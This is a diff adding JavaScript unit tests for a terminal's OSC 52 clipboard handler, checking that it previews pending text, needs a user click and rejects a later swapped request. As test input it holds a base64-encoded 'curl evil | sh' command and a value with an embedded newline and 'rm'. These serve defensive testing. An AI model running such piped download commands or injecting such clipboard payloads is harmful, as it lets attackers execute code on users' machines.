@@ -219,6 +219,35 @@ test('OSC 52 handler requires a user action before writing the clipboard', async
     delete global.navigator.clipboard;
 });
 
+test('OSC 52 prompt previews the text and a later request cannot swap it', async () => {
+    const writes = [];
+    let handler;
+    const presentations = [];
+    global.navigator.clipboard = {writeText(text) { writes.push(text); return Promise.resolve(); }};
+    const terminal = {parser: {registerOscHandler(identifier, callback) { handler = callback; return {dispose() {}}; }}};
+    global.window.showNotification = value => { presentations.push(value); };
+    const registered = TerminalManager.registerOsc52ClipboardHandler(terminal);
+
+    // "ls -la\nrm" then "curl evil | sh"
+    assert.equal(handler(';bHMgLWxhCnJt'), true);
+    assert.equal(handler(';Y3VybCBldmlsIHwgc2g='), true);
+
+    assert.equal(presentations.length, 1);
+    assert.match(presentations[0].message, /ls -la\u23cerm/);
+    presentations[0].action.onClick();
+    await new Promise(resolve => setImmediate(resolve));
+    assert.deepEqual(writes, ['ls -la\nrm']);
+    registered.dispose();
+    delete global.window.showNotification;
+    delete global.navigator.clipboard;
+});
+
+test('OSC 52 preview shows control characters and shortens long text', () => {
+    assert.equal(TerminalManager.osc52ClipboardPreview('a\tb\x1bc'), 'a b c');
+    const preview = TerminalManager.osc52ClipboardPreview('x'.repeat(200));
+    assert.equal(preview, `${'x'.repeat(80)}\u2026`);
+});
+
 test('socket output is acknowledged after TerminalManager accepts it', () => {
     const calls = [];
     const originalWriteOutput = TerminalManager.writeOutput;
